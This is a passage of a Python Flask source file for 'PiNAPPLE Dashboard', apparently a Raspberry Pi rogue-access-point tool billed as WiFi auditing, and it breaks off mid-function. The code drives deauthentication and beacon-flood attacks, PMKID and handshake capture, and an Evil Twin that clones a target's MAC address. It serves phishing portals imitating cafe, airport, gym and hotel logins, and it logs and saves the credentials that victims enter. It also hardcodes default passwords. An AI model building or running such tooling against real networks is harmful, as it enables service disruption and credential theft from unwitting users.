#!/usr/bin/env python3
"""PiNAPPLE Dashboard - WiFi Auditing Platform"""
import os, json, subprocess, csv, io, datetime, glob, uuid, signal, re, sys, threading, time, shutil
from functools import wraps
from html import escape as html_escape
from flask import Flask, request, jsonify, Response
from werkzeug.security import check_password_hash, generate_password_hash

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024

# PBKDF2 is available in every Python build; Werkzeug 3 defaults to scrypt,
# which is missing on some Python/OpenSSL combinations (and unnecessary here).
PASSWORD_METHOD = 'pbkdf2:sha256'


def hash_password(password):
    return generate_password_hash(str(password), method=PASSWORD_METHOD)


_DEFAULT_PASSWORD_HASH = hash_password('pinapple')

# ---------------------------------------------------------------------------
# Process/job state. Defined before any function that touches it so the module
# is safe to import and test in any order.
# ---------------------------------------------------------------------------
_hs_jobs = {}            # job_id -> handshake capture state
_deauth_jobs = {}        # job_id -> deauth burst/continuous state
_jobs_lock = threading.Lock()
_beacon_proc = [None]
_pmkid_proc = [None]
_pmkid_output = [None]
_pmkid_started = [None]
_evil_twin_job = [None]
_evil_twin_info = [None]
_wlan1_owner = [None]
_wlan1_claimed_at = [0.0]
_wlan1_lock = threading.Lock()
_recon_paused = [False]
_recon_stopped = [[]]
_recon_cache = {'at': 0.0, 'names': []}
WLAN1_OWNER_NAMES = {'beacon': 'Beacon Flood', 'deauth': 'Deauth', 'pmkid': 'PMKID',
                     'eviltwin': 'Evil Twin', 'handshake': 'Handshake'}
_saved_lock = threading.Lock()
_audit_lock = threading.Lock()

CONFIG_FILE = '/etc/pinapple/config.json'
CREDS_LOG = '/var/log/pinapple/creds.log'
SCAN_JSON = '/var/log/pinapple/scan.json'
LEASES_FILE = '/var/lib/misc/dnsmasq.leases'
LOG_DIR = '/var/log/pinapple'
SAVED_DIR = '/var/lib/pinapple/saved'
SAVED_INDEX = '/var/lib/pinapple/saved.json'
MAX_SAVED_ITEMS = 200
HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
EVILTWIN_BACKUP = '/etc/pinapple/hostapd-pre-eviltwin.conf'
FLAG_INTERNET = '/etc/pinapple/internet_enabled'
FLAG_DNS = '/etc/pinapple/dns_hijack_enabled'
FLAG_PORTAL = '/etc/pinapple/portal_redirect_enabled'
ACTIVE_PORTAL = '/opt/pinapple/portal/index.html'
PORTAL_DIR = '/opt/pinapple/portal'
WLAN1_MODE_FILE = '/etc/pinapple/wlan1_mode'
EVENTS_LOG = '/var/log/pinapple/events.log'
PORTAL_LABELS = {
    'creds': ('Credentials Phish', 'Email + password'),
    'hotel': ('Hotel Portal', 'Room + last name'),
    'splash': ('Splash Page', 'Terms only'),
    'coffee': ('Cafe Portal', 'Email + password, warm cafe styling'),
    'airport': ('Airport Portal', 'Email + password, terminal styling'),
    'library': ('Library Portal', 'Name + library card number'),
    'gym': ('Gym Portal', 'Email + password, dark member styling'),
}
DEAUTH_HELPER = '/usr/local/bin/pinapple-deauth'
BEACON_HELPER = '/usr/local/bin/pinapple-beacon-flood'
HANDSHAKE_HELPER = '/usr/local/bin/pinapple-handshake'

def load_config():
    defaults = {
        'username': 'admin',
        'password_hash': _DEFAULT_PASSWORD_HASH,
        'portal_type': 'creds',
    }
    try:
        with open(CONFIG_FILE) as f:
            cfg = json.load(f)
        if not isinstance(cfg, dict):
            return defaults
        for k, v in defaults.items():
            if k not in cfg:
                cfg[k] = v
        return cfg
    except (OSError, ValueError):
        return defaults

def save_config(cfg):
    os.makedirs('/etc/pinapple', exist_ok=True)
    with open(CONFIG_FILE, 'w') as f:
        json.dump(cfg, f, indent=2)
    try:
        os.chmod(CONFIG_FILE, 0o600)
    except OSError:
        pass


def ensure_config():
    """Create the config once so load_config() stops hashing on every request."""
    if not os.path.exists(CONFIG_FILE):
        try:
            save_config(load_config())
        except OSError:
            # Read-only or non-root run: fall back to the in-memory defaults.
            pass


def audit(message, level='info'):
    """Append a short human-readable event for the Activity log."""
    message = str(message).replace('\r', ' ').replace('\n', ' ')
    line = '%s [%s] %s' % (datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                           str(level).upper(), message)
    try:
        with _audit_lock:
            os.makedirs(LOG_DIR, exist_ok=True)
            with open(EVENTS_LOG, 'a') as handle:
                handle.write(line + '\n')
    except OSError:
        pass
    print(line, flush=True)

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        cfg = load_config()
        try:
            valid = (auth is not None and auth.username == cfg['username'] and
                     auth.password is not None and
                     check_password_hash(cfg['password_hash'], auth.password))
        except Exception:
            valid = False
        if not valid:
            return Response('Authentication required', 401,
                          {'WWW-Authenticate': 'Basic realm="PiNAPPLE"'})
        return f(*args, **kwargs)
    return decorated

def service_status(name):
    try:
        r = subprocess.run(['systemctl', 'is-active', name],
                           capture_output=True, text=True, timeout=5)
        return r.stdout.strip() == 'active'
    except Exception:
        return False


def restore_network_flags():
    """Re-apply iptables toggles after a reboot."""
    for flag, script in ((FLAG_INTERNET, '/usr/local/bin/pinapple-internet'),
                         (FLAG_PORTAL, '/usr/local/bin/pinapple-portal')):
        if not os.path.exists(flag) or not os.path.exists(script):
            continue
        try:
            subprocess.run([script, 'on'], capture_output=True, timeout=15)
        except Exception:
            pass


def recon_active():
    return any(service_status(name) for name in recon_service_candidates())


def wlan0_mac():
    try:
        with open('/sys/class/net/wlan0/address') as handle:
            return handle.read().strip().lower()
    except OSError:
        return ''


def system_checks():
    checks = []
    for name in ('mdk4', 'iw', 'airodump-ng', 'aireplay-ng', 'hcxdumptool',
                 'hcxpcapngtool', 'nmcli', 'hostapd', 'nginx'):
        found = shutil.which(name)
        if not found:
            for prefix in ('/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin'):
                candidate = os.path.join(prefix, name)
                if os.path.exists(candidate):
                    found = candidate
                    break
        checks.append((name, bool(found), found or 'not found'))
    wlan1 = os.path.exists('/sys/class/net/wlan1')
    checks.append(('wlan1 adapter', wlan1,
                   'detected' if wlan1 else 'not detected — plug in the USB adapter'))
    return checks


def iface_ip(name):
    """Return the first IPv4 address of an interface, or an empty string."""
    try:
        r = subprocess.run(['ip', '-4', '-o', 'addr', 'show', name],
                           capture_output=True, text=True, timeout=3)
        for line in r.stdout.splitlines():
            parts = line.split()
            if len(parts) > 3:
                return parts[3].split('/')[0]
    except Exception:
        pass
    return ''

def monitor_mode_active():
    try:
        r = subprocess.run(['iw', 'dev', 'wlan1', 'info'],
                           capture_output=True, text=True, timeout=5)
        return 'type monitor' in r.stdout
    except Exception:
        return False

def get_clients():
    clients = []
    try:
        with open(LEASES_FILE) as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) < 4:
                    continue
                try:
                    expires = datetime.datetime.fromtimestamp(int(parts[0])).isoformat()
                except (ValueError, OSError, OverflowError):
                    expires = parts[0]
                clients.append({
                    'expires': expires,
                    'mac': parts[1], 'ip': parts[2],
                    'hostname': parts[3] if parts[3] != '*' else 'unknown'
                })
    except OSError:
        pass
    return clients

def get_recon():
    try:
        with open(SCAN_JSON) as f:
            data = json.load(f)
        return data if isinstance(data, list) else []
    except (OSError, ValueError):
        return []

def get_creds():
    entries = []
    try:
        with open(CREDS_LOG) as f:
            for line in f:
                try:
                    entry = json.loads(line.strip())
                    if isinstance(entry, dict):
                        entries.append(entry)
                except ValueError:
                    pass
    except OSError:
        pass
    return entries

def read_hostapd_conf():
    cfg = {}
    try:
        with open(HOSTAPD_CONF) as f:
            for line in f:
                line = line.strip()
                if '=' in line and not line.startswith('#'):
                    k, v = line.split('=', 1)
                    cfg[k.strip()] = v.strip()
    except (OSError, ValueError):
        pass
    return cfg

def write_hostapd_conf(ssid, channel, mode, txpower):
    # SSIDs come from a web form; strip control characters so a newline
    # cannot inject extra hostapd directives.
    ssid = ''.join(ch if ord(ch) >= 32 and ord(ch) != 127 else ' '
                   for ch in str(ssid or ''))[:32]
    pwd_line = ''
    if mode == 'wpa2':
        pwd_line = '\nwpa=2\nwpa_passphrase=pinapple123\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP'
    conf = "interface=wlan0\ndriver=nl80211\nssid={}\nhw_mode=g\nchannel={}\nieee80211n=1\n".format(ssid, channel)
    conf += "ht_capab=[SHORT-GI-20][DSSS_CCK-40]\nwmm_enabled=1\nauth_algs=1\nignore_broadcast_ssid=0"
    conf += pwd_line + "\n"
    with open(HOSTAPD_CONF, 'w') as f:
        f.write(conf)


AP_TXPOWER_FILE = '/etc/pinapple/ap_txpower'
TX_POWER_DBM = {'low': 9, 'medium': 14, 'high': 20}


def unit_exists(name):
    for base in ('/etc/systemd/system', '/lib/systemd/system', '/usr/lib/systemd/system'):
        if os.path.exists(os.path.join(base, name + '.service')):
            return True
    return False


def ap_backend():
    """Prefer the hostapd stack when it is installed, else the NM hotspot."""
    if unit_exists('pinapple-ap') or service_status('pinapple-ap'):
        return 'hostapd'
    if nm_hotspot_connection():
        return 'networkmanager'
    return 'networkmanager'


def nm_hotspot_connection():
    candidates = []
    try:
        r = subprocess.run(['nmcli', '-t', '-f', 'NAME,DEVICE', 'connection', 'show', '--active'],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            name, sep, device = line.rpartition(':')
            if sep and device.strip() == 'wlan0' and name.strip():
                candidates.append(name.strip())
    except Exception:
        pass
    for name in candidates:
        if nm_connection_value(name, '802-11-wireless.mode') == 'ap':
            return name
    if candidates:
        return candidates[0]
    try:
        r = subprocess.run(['nmcli', '-t', '-f', 'NAME', 'connection', 'show'],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            name = line.strip()
            if name and ('hotspot' in name.lower() or 'pinapple' in name.lower()):
                return name
    except Exception:
        pass
    return ''


def nm_connection_value(conn, field):
    try:
        r = subprocess.run(['nmcli', '-t', '-g', field, 'connection', 'show', conn],
                           capture_output=True, text=True, timeout=5)
        return r.stdout.strip()
    except Exception:
        return ''


def nm_wlan0_connected():
    conn = nm_hotspot_connection()
    if not conn:
        return False
    mode = nm_connection_value(conn, '802-11-wireless.mode')
    if mode and mode != 'ap':
        return False
    try:
        r = subprocess.run(['nmcli', '-t', '-f', 'DEVICE,STATE', 'device', 'status'],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            device, sep, state = line.partition(':')
            if sep and device.strip() == 'wlan0':
                return 'connected' in state.lower()
    except Exception:
        pass
    return False


def ap_running():
    if ap_backend() == 'hostapd':
        return service_status('pinapple-ap')
    return nm_wlan0_connected()


def read_ap_txpower():
    try:
        with open(AP_TXPOWER_FILE) as f:
            value = f.read().strip()
        return value if value in TX_POWER_DBM else 'medium'
    except OSError:
        return 'medium'


def apply_ap_txpower(level):
    dbm = TX_POWER_DBM.get(level, 14)
    try:
        r = subprocess.run(['iw', 'dev', 'wlan0', 'set', 'txpower', 'fixed', str(dbm * 100)],
                           capture_output=True, text=True, timeout=5)
        return r.returncode == 0, (r.stderr or r.stdout).strip()
    except Exception as exc:
        return False, str(exc)

def get_wlan1_mode():
    try:
        r = subprocess.run(['iw', 'dev', 'wlan1', 'info'], capture_output=True, text=True, timeout=3)
        if r.returncode != 0:
            return 'missing'
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith('type '):
                t = line.split(None, 1)[1]
                if t == 'monitor': return 'monitor'
                if t == 'AP': return 'AP'
                if t == 'managed': return 'managed'
                return t
        return 'unknown'
    except Exception:
        return 'unknown'

def set_wlan1_mode(target):
    if target not in ('managed', 'monitor'):
        return False, f"Invalid target mode: {target}"
    try:
        subprocess.run(['ip', 'link', 'set', 'wlan1', 'down'], capture_output=True, timeout=5)
        r = subprocess.run(['iw', 'dev', 'wlan1', 'set', 'type', target], capture_output=True, text=True, timeout=5)
        if r.returncode != 0:
            return False, r.stderr.strip() or 'iw set type failed'
        subprocess.run(['ip', 'link', 'set', 'wlan1', 'up'], capture_output=True, timeout=5)
        return True, f"wlan1 set to {target}"
    except Exception as e:
        return False, str(e)


def read_desired_wlan1_mode():
    """Remember what the user chose so attacks restore the right state."""
    try:
        with open(WLAN1_MODE_FILE) as handle:
            value = handle.read().strip()
        return value if value in ('managed', 'monitor') else ''
    except OSError:
        return ''


def write_desired_wlan1_mode(mode):
    if mode not in ('managed', 'monitor'):
        return
    try:
        os.makedirs(os.path.dirname(WLAN1_MODE_FILE), exist_ok=True)
        with open(WLAN1_MODE_FILE, 'w') as handle:
            handle.write(mode)
    except OSError:
        pass


def service_enabled(name):
    try:
        return subprocess.run(['systemctl', 'is-enabled', '--quiet', name],
                              timeout=5).returncode == 0
    except Exception:
        return False

MAC_RE = re.compile(r'^(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$')


def valid_mac(value):
    return bool(MAC_RE.match((value or '').strip()))


_oui_db = {'loaded': False, 'map': {}}
OUI_FILES = ('/usr/share/ieee-data/oui.txt',
             '/usr/share/misc/oui.txt',
             '/var/lib/ieee-data/oui.txt')


def load_oui_db():
    if _oui_db['loaded']:
        return _oui_db['map']
    _oui_db['loaded'] = True
    db = {}
    for path in OUI_FILES:
        if not os.path.exists(path):
            continue
        try:
            with open(path, errors='ignore') as handle:
                for line in handle:
                    match = re.match(
                        r'^([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})\s+\(hex\)\s+(.+)$',
                        line)
                    if match:
                        key = (match.group(1) + match.group(2) + match.group(3)).upper()
                        db.setdefault(key, match.group(4).strip())
        except OSError:
            continue
        if db:
            break
    _oui_db['map'] = db
    return db


def vendor_for_mac(value):
    key = re.sub(r'[^0-9A-Fa-f]', '', value or '').upper()[:6]
    if len(key) != 6:
        return ''
    return load_oui_db().get(key, '')


def with_vendor(records, field='mac'):
    out = []
    for item in records or []:
        copy = dict(item)
        copy['vendor'] = vendor_for_mac(str(copy.get(field, '')))
        out.append(copy)
    return out


def channel_for_bssid(bssid):
    """Look up a target's channel from the last recon scan, if available."""
    target = (bssid or '').lower()
    for network in get_recon():
        if str(network.get('bssid', '')).lower() == target:
            try:
                return int(network.get('channel') or 0)
            except (TypeError, ValueError):
                return 0
    return 0


def ssid_for_bssid(bssid):
    target = (bssid or '').lower()
    for network in get_recon():
        if str(network.get('bssid', '')).lower() == target:
            return str(network.get('ssid', '') or '')
    return ''


def resolve_channel(requested, bssid):
    if requested not in (None, '', 0, '0'):
        try:
            channel = int(requested)
        except (TypeError, ValueError):
            return None, 'channel must be a number'
        if not 1 <= channel <= 14:
            return None, 'channel must be between 1 and 14'
        return channel, None
    return channel_for_bssid(bssid), None


def set_wlan1_channel(channel):
    if not channel:
        return True, ''
    try:
        r = subprocess.run(['iw', 'dev', 'wlan1', 'set', 'channel', str(channel)],
                           capture_output=True, text=True, timeout=5)
        if r.returncode != 0:
            return False, (r.stderr or r.stdout).strip() or 'iw set channel failed'
        return True, ''
    except Exception as e:
        return False, str(e)


def split_nmcli_fields(line):
    """Split nmcli -t output on unescaped colons.

    nmcli escapes ':' inside a field as '\\:' (and '\\' as '\\\\'), so a naive
    line.split(':') corrupts SSIDs and BSSIDs that contain colons.
    """
    fields = []
    current = []
    i = 0
    while i < len(line):
        ch = line[i]
        if ch == '\\' and i + 1 < len(line):
            current.append(line[i + 1])
            i += 2
            continue
        if ch == ':':
            fields.append(''.join(current))
            current = []
            i += 1
            continue
        current.append(ch)
        i += 1
    fields.append(''.join(current))
    return fields


def freq_to_channel(freq):
    try:
        freq = int(freq)
    except (TypeError, ValueError):
        return 0
    if freq == 2484:
        return 14
    if 2412 <= freq <= 2472:
        return (freq - 2407) // 5
    if 5000 <= freq <= 5900:
        return (freq - 5000) // 5
    return 0


def parse_iw_scan(text):
    """Parse `iw dev wlan1 scan` output into the dashboard's recon schema."""
    networks = []
    current = None

    def finish():
        if current and valid_mac(current['bssid']):
            if current.get('privacy') and current['encryption'] == 'Open':
                current['encryption'] = 'WEP'
            current.pop('privacy', None)
            networks.append(current)

    for line in (text or '').splitlines():
        stripped = line.strip()
        if stripped.startswith('BSS '):
            finish()
            bssid = stripped[4:].split('(')[0].strip()
            current = {'ssid': '', 'bssid': bssid, 'channel': 0, 'signal': 0,
                       'signal_unit': 'dBm', 'encryption': 'Open',
                       'first_seen': datetime.datetime.now().strftime('%H:%M:%S')}
            continue
        if current is None:
            continue
        if stripped.startswith('freq:'):
            channel = freq_to_channel(stripped.split(':', 1)[1])
            if channel:
                current['channel'] = channel
        elif stripped.startswith('signal:'):
            try:
                current['signal'] = int(float(stripped.split(':', 1)[1].split()[0]))
            except (TypeError, ValueError):
                pass
        elif stripped.startswith('SSID:'):
            current['ssid'] = re.sub(r'[\x00-\x1f\x7f]+', ' ',
                                     stripped.split(':', 1)[1]).strip()
        elif stripped.startswith('RSN:'):
            current['encryption'] = 'WPA2'
        elif stripped.startswith('WPA:'):
            if current['encryption'] == 'Open':
                current['encryption'] = 'WPA'
        elif 'Authentication suites:' in stripped:
            if 'SAE' in stripped:
                current['encryption'] = 'WPA3'
        elif stripped.startswith('capability:'):
            if 'Privacy' in stripped:
                current['privacy'] = True
    finish()
    return [n for n in networks if n['bssid']]


def parse_nmcli_wifi(output):
    """Parse `nmcli -t -f SSID,BSSID,CHAN,SIGNAL,SECURITY` output."""
    networks = []
    for line in (output or '').strip().split('\n'):
        if not line.strip():
            continue
        parts = split_nmcli_fields(line)
        if len(parts) < 5:
            continue
        ssid = re.sub(r'[\x00-\x1f\x7f]+', ' ', parts[0]).strip()
        bssid = parts[1].strip()
        chan = int(parts[2]) if parts[2].strip().isdigit() else 0
        quality = int(parts[3]) if parts[3].strip().isdigit() else 0
        sec = parts[4].strip()
        if not ssid or not valid_mac(bssid):
            continue
        upper = sec.upper()
        if 'WPA3' in upper:
            encryption = 'WPA3'
        elif 'WPA2' in upper:
            encryption = 'WPA2'
        elif 'WPA' in upper:
            encryption = 'WPA'
        elif 'WEP' in upper:
            encryption = 'WEP'
        else:
            encryption = 'Open'
        # nmcli reports a 0-100 quality value. Convert it to an approximate
        # dBm so monitor and NetworkManager results sort consistently.
        networks.append({
            'ssid': ssid,
            'bssid': bssid,
            'channel': chan,
            'signal': max(-100, min(-30, int(quality / 2) - 100)),
            'signal_percent': quality,
            'signal_unit': 'dBm',
            'encryption': encryption,
            'first_seen': datetime.datetime.now().strftime('%H:%M:%S'),
        })
    return networks


def scan_wlan1_with_iw():
    if not shutil.which('iw'):
        return [], 'iw is not installed'
    try:
        r = subprocess.run(['iw', 'dev', 'wlan1', 'scan'],
                           capture_output=True, text=True, timeout=25)
    except (OSError, subprocess.SubprocessError) as exc:
        return [], str(exc)
    if r.returncode != 0:
        detail = (r.stderr or r.stdout).strip().splitlines()
        return [], detail[-1] if detail else 'iw scan failed'
    return parse_iw_scan(r.stdout), ''


def parse_channel_list(value):
    if isinstance(value, (list, tuple)):
        value = ','.join(str(v) for v in value)
    channels = []
    for item in str(value or '').split(','):
        item = item.strip()
        if not item:
            continue
        try:
            channel = int(item)
        except (TypeError, ValueError):
            return None
        if not 1 <= channel <= 14 or channel in channels:
            return None
        channels.append(channel)
    if not channels or len(channels) > 8:
        return None
    return channels


def deauth_command(bssid, client, channel, rate, continuous=False, count=10):
    cmd = [sys.executable, DEAUTH_HELPER, bssid, client,
           str(count), 'wlan1', '--rate', str(rate)]
    if channel:
        cmd += ['--channel', str(channel)]
    if continuous:
        cmd += ['--continuous']
    return cmd


def terminate_process_group(proc, timeout=3):
    """Stop a helper and any children it started without killing Flask."""
    if proc is None:
        return False
    if proc.poll() is not None:
        return True
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except OSError:
        try:
            proc.terminate()
        except OSError:
            pass
    try:
        proc.wait(timeout=timeout)
        return True
    except subprocess.TimeoutExpired:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except OSError:
            try:
                proc.kill()
            except OSError:
                pass
        return True


def safe_kill_pid(pid, marker):
    """Only kill a PID-file process if it is still our helper."""
    if not os.path.isdir('/proc'):
        # PID files are a Linux/Pi concern; never blindly kill on other hosts.
        return False
    try:
        cmdline_path = '/proc/%d/cmdline' % pid
        if not os.path.exists(cmdline_path):
            return False
        with open(cmdline_path) as f:
            cmdline = f.read().replace('\x00', ' ')
        if marker not in cmdline:
            return False
        os.kill(pid, signal.SIGTERM)
        return True
    except (OSError, ValueError):
        return False


def pid_alive(pid, marker):
    if not os.path.isdir('/proc'):
        return False
    try:
        with open('/proc/%d/cmdline' % int(pid)) as f:
            return marker in f.read().replace('\x00', ' ')
    except (OSError, ValueError):
        return False


def read_json_file(path, default):
    try:
        with open(path) as f:
            return json.load(f)
    except (OSError, ValueError):
        return default


def write_json_file(path, data):
    directory = os.path.dirname(path)
    if directory:
        os.makedirs(directory, exist_ok=True)
    tmp = '%s.tmp.%d' % (path, os.getpid())
    with open(tmp, 'w') as f:
        json.dump(data, f, indent=2)
    os.replace(tmp, path)


def truncate_utf8(text, max_bytes):
    encoded = text.encode('utf-8')[:max_bytes]
    return encoded.decode('utf-8', 'ignore').rstrip()


def saved_items():
    data = read_json_file(SAVED_INDEX, {'items': []})
    if isinstance(data, list):
        items = data
    elif isinstance(data, dict):
        items = data.get('items') or []
    else:
        items = []
    if not isinstance(items, list):
        items = []
    return [i for i in items if isinstance(i, dict) and i.get('id') and i.get('file')]


def saved_write(items):
    write_json_file(SAVED_INDEX, {'version': 1, 'items': items})


def saved_path(item):
    """Resolve an indexed file inside SAVED_DIR, refusing path traversal."""
    name = os.path.basename(str(item.get('file', '')))
    if not name:
        return None
    base = os.path.realpath(SAVED_DIR)
    path = os.path.realpath(os.path.join(base, name))
    if not path.startswith(base + os.sep):
        return None
    return path if os.path.exists(path) else None


def saved_add(kind, title, src_path=None, payload=None, ext='bin',
              subtitle='', meta=None):
    """Copy/write one valuable result into the local Saved library."""
    with _saved_lock:
        items = saved_items()
        stamp = datetime.datetime.now()
        item_id = stamp.strftime('%Y%m%d-%H%M%S-') + uuid.uuid4().hex[:6]
        safe_ext = re.sub(r'[^a-z0-9]+', '', str(ext or 'bin').lower()) or 'bin'
        filename = '%s.%s' % (item_id, safe_ext)
        os.makedirs(SAVED_DIR, exist_ok=True)
        dest = os.path.join(SAVED_DIR, filename)
        if src_path:
            shutil.copy2(src_path, dest)
        else:
            with open(dest, 'wb') as handle:
                handle.write(payload or b'')
        item = {
            'id': item_id,
            'type': str(kind),
            'title': str(title or kind),
            'subtitle': str(subtitle or ''),
            'created': stamp.isoformat(timespec='seconds'),
            'file': filename,
            'size': os.path.getsize(dest),
            'meta': meta or {},
        }
        items.insert(0, item)
        while len(items) > MAX_SAVED_ITEMS:
            old = items.pop()
            old_path = saved_path(old)
            if old_path:
                try:
                    os.remove(old_path)
                except OSError:
                    pass
        saved_write(items)
        return item


def saved_find(item_id):
    for item in saved_items():
        if item.get('id') == item_id:
            return item
    return None


def saved_delete(item_id):
    with _saved_lock:
        items = saved_items()
        keep = []
        removed = None
        for item in items:
            if item.get('id') == item_id:
                removed = item
            else:
                keep.append(item)
        if not removed:
            return False
        path = saved_path(removed)
        if path:
            try:
                os.remove(path)
            except OSError:
                pass
        saved_write(keep)
        return True


def saved_snapshot(source):
    sources = {
        'recon': get_recon,
        'probes': get_probes,
        'tracker': get_tracker,
        'clients': get_clients,
        'creds': get_creds,
    }
    reader = sources.get(source)
    if not reader:
        return None
    data = reader()
    payload = json.dumps({
        'source': source,
        'created': datetime.datetime.now().isoformat(timespec='seconds'),
        'count': len(data),
        'items': data,
    }, indent=2, default=str).encode('utf-8')
    labels = {
        'recon': 'Recon networks',
        'probes': 'Probe requests',
        'tracker': 'Client tracker',
        'clients': 'Connected clients',
        'creds': 'Captured credentials',
    }
    return saved_add(source, labels.get(source, source), payload=payload,
                     ext='json', subtitle='%d records' % len(data),
                     meta={'source': source, 'count': len(data)})


def human_size(size):
    size = int(size or 0)
    if size < 1024:
        return '%d B' % size
    if size < 1024 * 1024:
        return '%d KB' % (size // 1024)
    return '%.1f MB' % (size / (1024.0 * 1024.0))


def build_beacon_ssids(phrase, count):
    """Return the exact SSIDs written to the helper's input file."""
    phrase = re.sub(r'[\x00-\x1f\x7f]+', ' ', str(phrase or '')).strip()
    if not phrase:
        raise ValueError('enter a network name or phrase')
    if count == 1:
        base = truncate_utf8(phrase, 32)
        return [base], phrase != base
    suffix = ' %d' % count
    base = truncate_utf8(phrase, 32 - len(suffix))
    if not base:
        raise ValueError('phrase is too short')
    return ['%s %d' % (base, index) for index in range(1, count + 1)], phrase != base


def auto_beacon_rate(count):
    """A total packet rate that can cover every SSID in a short scan."""
    return max(200, min(500, int(count) * 10))


def beacon_log_tail(limit=1600):
    try:
        with open(BEACON_LOG) as f:
            data = f.read()
        return data[-limit:].strip()
    except OSError:
        return ''


def stop_beacon_process():
    """Stop the dashboard-owned beacon helper and clean its PID/status files."""
    # Read telemetry first: it carries the mdk4 PID, which runs in its own
    # session and would survive a helper that cannot clean up in time.
    details = read_json_file(BEACON_STATUS, {})
    mdk4_pid = details.get('mdk4_pid')
    if isinstance(mdk4_pid, int) and mdk4_pid > 1:
        safe_kill_pid(mdk4_pid, 'mdk4')

    proc = _beacon_proc[0]
    _beacon_proc[0] = None
    stopped = terminate_process_group(proc) if proc is not None else False

    try:
        with open(BEACON_PID) as f:
            pid = int(f.read().strip())
        if safe_kill_pid(pid, 'pinapple-beacon-flood'):
            stopped = True
    except (OSError, ValueError):
        pass

    for path in (BEACON_PID, BEACON_STATUS):
        try:
            os.remove(path)
        except OSError:
            pass
    return stopped


def stop_deauth_jobs():
    with _jobs_lock:
        jobs = list(_deauth_jobs.values())
        _deauth_jobs.clear()
    for job in jobs:
        terminate_process_group(job.get('proc'))
    try:
        with open(DEAUTH_PID) as f:
            pid = int(f.read().strip())
        safe_kill_pid(pid, 'pinapple-deauth')
    except (OSError, ValueError):
        pass
    try:
        os.remove(DEAUTH_PID)
    except OSError:
        pass


def stop_wlan1_jobs(except_owner=None):
    """Stop every wlan1 user except the one that is about to take over."""
    if except_owner != 'beacon':
        stop_beacon_process()
    if except_owner != 'deauth':
        stop_deauth_jobs()
    if except_owner != 'handshake':
        stop_handshake_jobs()
    if except_owner != 'pmkid':
        if _pmkid_proc[0] is not None:
            terminate_process_group(_pmkid_proc[0])
            _pmkid_proc[0] = None
        else:
            try:
                with open(PMKID_PID) as f:
                    safe_kill_pid(int(f.read().strip()), 'hcxdumptool')
            except (OSError, ValueError):
                pass
        for path in (PMKID_PID, PMKID_STATE):
            try:
                os.remove(path)
            except OSError:
                pass
    if except_owner != 'eviltwin':
        was_twin = bool(_evil_twin_job[0] is not None or
                        os.path.exists(EVILTWIN_BACKUP) or
                        os.path.exists(EVILTWIN_STATE))
        if _evil_twin_job[0] is not None:
            terminate_process_group(_evil_twin_job[0])
            _evil_twin_job[0] = None
        else:
            try:
                with open(EVILTWIN_PID) as f:
                    safe_kill_pid(int(f.read().strip()), 'pinapple-deauth')
            except (OSError, ValueError):
                pass
        _evil_twin_info[0] = None
        if was_twin:
            # The Evil Twin changed wlan0 into the cloned AP. Whoever is
            # taking over wlan1 must not leave the user's real AP broken.
            restore_ap_after_eviltwin('another wlan1 tool took the radio')


def stop_handshake_jobs():
    """Cancel any in-flight handshake capture so it cannot fight for wlan1."""
    with _jobs_lock:
        jobs = list(_hs_jobs.values())
    for job in jobs:
        if job.get('status') != 'running':
            continue
        job['status'] = 'cancelled'
        job['output'] = (job.get('output') or '') + '\nCancelled: another wlan1 tool took the radio.'
        audit('Handshake capture cancelled: %s' % job.get('bssid', 'unknown'), 'warn')
        proc = job.get('proc')
        if proc is not None:
            terminate_process_group(proc, timeout=2)


def prune_handshake_jobs(max_age=3600, keep=20):
    """Drop old finished captures so the job dict cannot grow forever."""
    now = time.time()
    with _jobs_lock:
        finished = sorted(
            ((jid, job) for jid, job in _hs_jobs.items()
             if job.get('status') != 'running'),
            key=lambda item: item[1].get('started_epoch', 0))
        overflow = max(0, len(finished) - keep)
        for index, (jid, job) in enumerate(finished):
            if index < overflow or now - job.get('started_epoch', now) > max_age:
                _hs_jobs.pop(jid, None)


def restore_wlan1_idle():
    """Leave wlan1 in the mode the user last chose after an attack ends."""
    with _wlan1_lock:
        idle = _wlan1_owner[0] is None
    if not idle:
        return
    desired = read_desired_wlan1_mode()
    if not desired:
        # First run: prefer the packaged monitor service when available.
        desired = 'monitor' if service_enabled('pinapple-monitor') else 'managed'
    if desired == 'managed':
        stop_recon_now()
        set_monitor_service_enabled(False)
        set_wlan1_mode('managed')
        return
    if _recon_paused[0]:
        resume_recon()
    if not recon_active():
        start_recon_now()
    if get_wlan1_mode() != 'monitor' and not recon_active():
        set_wlan1_mode('monitor')


def restore_ap_after_eviltwin(reason=''):
    """Restore the user's original wlan0 AP after an Evil Twin run."""
    state = read_json_file(EVILTWIN_STATE, {})
    for path in (EVILTWIN_PID, EVILTWIN_STATE):
        try:
            os.remove(path)
        except OSError:
            pass

    try:
        subprocess.run(['systemctl', 'stop', 'pinapple-ap'],
                       capture_output=True, text=True, timeout=10)
    except Exception:
        pass
    try:
        subprocess.run(['ip', 'link', 'set', 'wlan0', 'down'],
                       capture_output=True, timeout=5)
        original = state.get('original_mac') or ''
        if original:
            subprocess.run(['ip', 'link', 'set', 'wlan0', 'address', original],
                           capture_output=True, timeout=5)
        else:
            subprocess.run(['macchanger', '-p', 'wlan0'], capture_output=True, timeout=5)
        subprocess.run(['ip', 'link', 'set', 'wlan0', 'up'],
                       capture_output=True, timeout=5)
    except Exception:
        pass

    try:
        if os.path.exists(EVILTWIN_BACKUP):
            shutil.copy2(EVILTWIN_BACKUP, HOSTAPD_CONF)
            os.remove(EVILTWIN_BACKUP)
        else:
            write_hostapd_conf('PiNAPPLE', 6, 'wpa2', None)
    except OSError as exc:
